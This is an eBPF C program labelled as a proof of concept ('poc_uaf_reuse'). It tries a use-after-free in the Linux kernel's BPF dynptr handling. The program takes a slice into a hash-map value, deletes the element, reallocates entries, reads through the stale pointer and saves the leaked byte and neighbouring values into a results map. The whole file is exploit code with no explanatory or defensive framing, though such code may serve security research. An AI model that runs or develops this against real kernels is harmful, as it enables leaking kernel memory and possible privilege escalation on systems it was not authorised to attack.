// SPDX-License-Identifier: GPL-2.0
#include <linux/bpf.h>
#include <bpf/bpf_helpers.h>

struct bpf_dynptr { __u64 __opaque[2]; } __attribute__((aligned(8)));

extern void *bpf_dynptr_slice(const struct bpf_dynptr *ptr, __u32 offset,
                              void *buffer__opt, __u32 buffer__szk) __ksym;

struct {
	__uint(type, BPF_MAP_TYPE_HASH);
	__uint(max_entries, 8);
	__type(key, __u32);
	__type(value, __u64);
} data_map SEC(".maps");

struct {
	__uint(type, BPF_MAP_TYPE_ARRAY);
	__uint(max_entries, 8);
	__type(key, __u32);
	__type(value, __u64);
} results SEC(".maps");

SEC("socket")
int poc_uaf_reuse(struct __sk_buff *skb)
{
	__u32 k0 = 0, k1 = 1, k2 = 2;
	__u64 *val0, *val1, *val2;

	__u64 init = 0xdeadbeefcafe0001ULL;
	bpf_map_update_elem(&data_map, &k0, &init, BPF_ANY);

	val0 = bpf_map_lookup_elem(&data_map, &k0);
	if (!val0) return 0;

	struct bpf_dynptr dptr;
	bpf_dynptr_from_mem(val0, sizeof(*val0), 0, &dptr);
	__u8 *slice = bpf_dynptr_slice(&dptr, 0, NULL, 1);
	if (!slice) return 0;

	bpf_map_delete_elem(&data_map, &k0);

	__u64 new_val = 0x5151515151515151ULL;
	bpf_map_update_elem(&data_map, &k2, &new_val, BPF_ANY);

	val1 = bpf_map_lookup_elem(&data_map, &k1);
	if (!val1) return 0;
	*val1 = 0xbbbbbbbbbbbbbbbbULL;
	bpf_dynptr_from_mem(val1, sizeof(*val1), 0, &dptr);

	__u8 leaked = *slice;

	__u32 rk = 0;
	__u64 out = (__u64)leaked;
	bpf_map_update_elem(&results, &rk, &out, BPF_ANY);

	rk = 1;
	out = *val1;
	bpf_map_update_elem(&results, &rk, &out, BPF_ANY);

	val2 = bpf_map_lookup_elem(&data_map, &k2);
	if (val2) {
		rk = 2;
		out = *val2;
		bpf_map_update_elem(&results, &rk, &out, BPF_ANY);
	}

	rk = 3;
	out = 0xdeadbeef;
	bpf_map_update_elem(&results, &rk, &out, BPF_ANY);

	return 0;
}

char LICENSE[] SEC("license") = "GPL";
